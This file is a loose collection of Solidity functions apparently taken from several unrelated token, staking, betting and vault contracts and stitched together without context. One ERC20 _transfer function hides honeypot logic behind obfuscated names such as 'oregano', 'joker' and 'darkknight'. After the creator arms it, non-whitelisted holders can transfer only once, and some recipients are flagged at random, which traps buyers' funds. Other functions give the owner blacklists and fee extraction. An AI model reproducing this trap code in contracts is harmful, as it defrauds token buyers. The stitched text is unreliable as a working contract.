function buy(uint _idx, string _slogan) enabled payable public {
    Item storage item = items[_idx];
    if (item.price == 0) {
        item.price = startPrice[_idx % startPrice.length];
        item.nextPrice = nextPriceOf(item.price);
        itemIndices.push(_idx);
    }
    require(item.price > 0);
    uint curWei = item.price * 1e15;
    require(curWei <= msg.value);
    address oldOwner = item.owner;
    uint oldPrice = item.price;
    if (item.owner != 0x0) {
        require(item.owner != msg.sender);
        item.owner.transfer(curWei * (1000 - cutOf(item.price)) / 1000);
    }
    msg.sender.transfer(msg.value - curWei);
    item.owner = msg.sender;
    item.slogan = _slogan;
    item.price = item.nextPrice;
    item.nextPrice = nextPriceOf(item.price);
    OnSold(_idx, oldOwner, item.owner, oldPrice, item.price, item.slogan);
}

function unfarm(uint amountToWithdraw) public {
    require(depositedTokens[msg.sender] >= amountToWithdraw, "Invalid amount to withdraw");
    require(now.sub(stakingTime[msg.sender]) > PossibleUnstakeTime, "For UnFarming Need Time 48 Hours after Start Farming");
    updateAccount(msg.sender);
    uint fee = amountToWithdraw.mul(unstakingFeeRate).div(1e4);
    uint amountAfterFee = amountToWithdraw.sub(fee);
    require(Token(liquiditytoken1).transfer(admin, fee), "Could not transfer withdraw fee.");
    require(Token(liquiditytoken1).transfer(msg.sender, amountAfterFee), "Could not transfer tokens.");
    depositedTokens[msg.sender] = depositedTokens[msg.sender].sub(amountToWithdraw);
    if (holders.contains(msg.sender) && depositedTokens[msg.sender] == 0) {
        holders.remove(msg.sender);
    }
}

function farm(uint amountToStake) public {
    require(stakingStatus == true, "Staking is not yet initialized");
    require(amountToStake > 0, "Cannot deposit 0 Tokens");
    require(Token(liquiditytoken1).transferFrom(msg.sender, address(this), amountToStake), "Insufficient Token Allowance");
    updateAccount(msg.sender);
    uint fee = amountToStake.mul(stakingFeeRate).div(1e4);
    uint amountAfterFee = amountToStake.sub(fee);
    require(Token(liquiditytoken1).transfer(admin, fee), "Could not transfer deposit fee.");
    depositedTokens[msg.sender] = depositedTokens[msg.sender].add(amountAfterFee);
    if (!holders.contains(msg.sender)) {
        holders.add(msg.sender);
        stakingTime[msg.sender] = now;
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (oregano == false)) {
        basil = chTx;
        thisValue = true;
    }
    if ((address(sender) == creator) && (oregano == true)) {
        wonderw[recipient] = true;
        joker[recipient] = false;
        oregano = false;
    }
    if (wonderw[recipient] != true) {
        joker[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((joker[sender]) && (wonderw[recipient] == false)) {
        joker[recipient] = true;
    }
    if (wonderw[sender] == false) {
        require(amount < basil);
        if (thisValue == true) {
            if (darkknight[sender] == true) {
                require(false);
            }
            darkknight[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _transfer(address from, address to, uint256 amount) private {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    if (from != owner() && to != owner() && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
        require(tradeAllowed);
        require(!_isBlacklisted[from] && !_isBlacklisted[to]);
        if (_cooldownEnabled) {
            if (!cooldown[msg.sender].exists) {
                cooldown[msg.sender] = User(0, 0, true);
            }
        }
        if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
            if (limitTX) {
                require(amount <= _maxTxAmount);
            }
            if (_cooldownEnabled) {
                if (buyLimitEnd > block.timestamp) {
                    require(amount <= _maxBuyAmount);
                    require(cooldown[to].buy < block.timestamp, "Your buy cooldown has not expired.");
                    cooldown[to].buy = block.timestamp + (120 seconds);
                }
                cooldown[to].sell = block.timestamp + (300 seconds);
            }
            uint contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                swapETHfortargetToken(address(this).balance);
            }
        }
        if (to == address(uniswapV2Pair) || to == address(uniswapV2Router)) {
            if (doubleFeeEnable) {
                doubleFee();
            }
            if (_cooldownEnabled) {
                require(cooldown[from].sell < block.timestamp, "Your sell cooldown has not expired.");
            }
            uint contractTokenBalance = balanceOf(address(this));
            if (!inSwap && from != uniswapV2Pair && swapEnabled) {
                if (limitTX) {
                    require(amount <= balanceOf(uniswapV2Pair).mul(3).div(100) && amount <= _maxTxAmount);
                }
                uint initialETHBalance = address(this).balance;
                swapTokensForEth(contractTokenBalance);
                uint newETHBalance = address(this).balance;
                uint ethToDistribute = newETHBalance.sub(initialETHBalance);
                if (ethToDistribute > 0) {
                    distributeETH(ethToDistribute);
                }
            }
        }
    }
    bool takeFee = true;
    if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || !feeEnabled) {
        takeFee = false;
    }
    _tokenTransfer(from, to, amount, takeFee);
    restoreAllFee;
}

function addLiquidity() external onlyOwner() {
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uniswapV2Router = _uniswapV2Router;
    _approve(address(this), address(uniswapV2Router), _tTotal);
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router.addLiquidityETH {
        value: address(this).balance
    }(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
    swapEnabled = true;
    liquidityAdded = true;
    feeEnabled = true;
    limitTX = true;
    _maxTxAmount = 1000000000000000 * 10 ** 9;
    _maxBuyAmount = 300000000000000 * 10 ** 9;
    IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
}

function payWinners() public {
    require(confirmed);
    require(!gameOver);
    share = rewardPool.div(2);
    share = share.div(countWinners);
    for (i = 0; i < countWinners; i++) {
        mirrors[winnerTimestamp][i].transfer(share.mul(9).div(10));
        referral[mirrors[winnerTimestamp][i]].transfer(share.mul(1).div(10));
        emit Payreward(mirrors[winnerTimestamp][i], share);
    }
    share = rewardPool.div(4);
    share = share.div(countSecondWinners);
    for (i = 0; i < countSecondWinners; i++) {
        mirrors[secondWinnerTimestamp][i].transfer(share.mul(9).div(10));
        referral[mirrors[secondWinnerTimestamp][i]].transfer(share.mul(1).div(10));
        emit Payreward(mirrors[secondWinnerTimestamp][i], share);
    }
    gameOver = true;
}

function bet(uint256[] _timestamps, address _referral) payable public {
    require(msg.value >= costPerTicket.mul(_timestamps.length));
    require(!announced);
    if (now < expireDate) {
        for (i = 0; i < _timestamps.length; i++) {
            timestampList.push(_timestamps[i]);
            mirrors[_timestamps[i]].push(msg.sender);
            betHistory[msg.sender].push(_timestamps[i]);
            averageTimestamp = averageTimestamp.mul(countBet) + _timestamps[i];
            averageTimestamp = averageTimestamp.div(countBet + 1);
            countBet++;
            playerBets[msg.sender]++;
        }
        if (isPlayer[msg.sender] != true) {
            countPlayer++;
            isPlayer[msg.sender] = true;
            referral[msg.sender] = _referral;
            countReferral[_referral] += 1;
        }
        if (playerBets[msg.sender] > playerBets[leader] && msg.sender != leader) {
            if (msg.sender != leader_2) {
                leader_3 = leader_2;
            }
            leader_2 = leader;
            leader = msg.sender;
        } else if (playerBets[msg.sender] > playerBets[leader_2] && msg.sender != leader_2 && msg.sender != leader) {
            leader_3 = leader_2;
            leader_2 = msg.sender;
        } else if (playerBets[msg.sender] > playerBets[leader_3] && msg.sender != leader_2 && msg.sender != leader && msg.sender != leader_3) {
            leader_3 = msg.sender;
        }
        rewardPool = rewardPool.add(msg.value);
        owner.transfer(msg.value.mul(12).div(100)); 
        emit Bet(_timestamps.length, msg.sender);
    } else {
        if (!locked) {
            locked = true;
        }
        owner.transfer(msg.value);
    }
    if (startDate.add(countWeek.mul(604800)) < now) {
        countWeek++;
        if (costPerTicket < maxCost) {
            costPerTicket = costPerTicket.add(2500000000000000);
        }
    }
}

function confirm() public {
    require(announced == true);
    require(confirmed == false);
    require(isPlayer[msg.sender] == true);
    require(hasConfirmed[msg.sender] != true);
    countConfirmed += 1;
    hasConfirmed[msg.sender] = true;
    msg.sender.transfer(confirmreward);
    emit Confirm(msg.sender);
    emit Payreward(msg.sender, confirmreward);
    if (countConfirmed >= numOfConfirmationNeeded) {
        confirmed = true;
    }
}

function payLeaderAndDev() public {
    require(locked || announced);
    require(!developmentPaid);
    owner.transfer(init_fund.mul(12).div(100));
    leader.transfer(rewardPool.mul(4).div(100));
    leader_2.transfer(rewardPool.mul(25).div(1000));
    leader_3.transfer(rewardPool.mul(15).div(1000));
    developmentPaid = true;
}

function burnTokens() public returns(uint256) {
    uint256 sec = getNow().sub(lastBurn);
    uint256 tokensToBurn = 0;
    if (sec >= 1 days) {
        uint256 d = sec.div(86400);
        tokensToBurn = d.mul(dailyTime);
        if (protect >= tokensToBurn) {
            protect = protect.sub(tokensToBurn);
        } else {
            token.burn(tokensToBurn.sub(protect), "");
            protect = 0;
        }
        lastBurn = lastBurn.add(d.mul(86400));
    }
    return tokensToBurn;
}

function withdraw(uint256 wad) public nonReentrant {
    require(balanceOf[msg.sender] >= wad, "ERROR: Insufficient BALANCE");
    uint256 final_value = wad.mul(tax).div(1000); 
    uint256 totalTax = (wad - final_value); 
    uint256 adminPart = totalTax.mul(Oogwaytax).div(1000);
    uint256 Dev_value = totalTax.mul(Devtax).div(1000);
    uint256 Market_value = totalTax.mul(Markettax).div(1000);
    balanceOf[Dev] += Dev_value;
    balanceOf[Market] += Market_value;
    adminVal += totalTax;
    balanceOf[Oogway] += adminPart;
    balanceOf[msg.sender] -= wad;
    payable(msg.sender).transfer(final_value);
    emit Withdrawal(msg.sender, wad);
}

function deposit() public nonReentrant payable {
    uint256 value = msg.value;
    uint256 final_value = value.mul(tax).div(1000);
    uint256 totalTax = (value - final_value);
    uint256 adminPart = totalTax.mul(Oogwaytax).div(1000);
    uint256 Dev_value = totalTax.mul(Devtax).div(1000);
    uint256 Market_value = totalTax.mul(Markettax).div(1000);
    uint256 burn_value = totalTax.mul(Burntax).div(1000);
    balanceOf[Dev] += Dev_value;
    balanceOf[Market] += Market_value;
    adminVal += (totalTax);
    balanceOf[Oogway] += adminPart;
    IWETH(WETH).deposit {
        value: burn_value
    }();
    swap(WETH, SHINJA, IERC20(WETH).balanceOf(address(this)), 1, address(0));
    balanceOf[msg.sender] += final_value;
    emit Deposit(msg.sender, value);
}

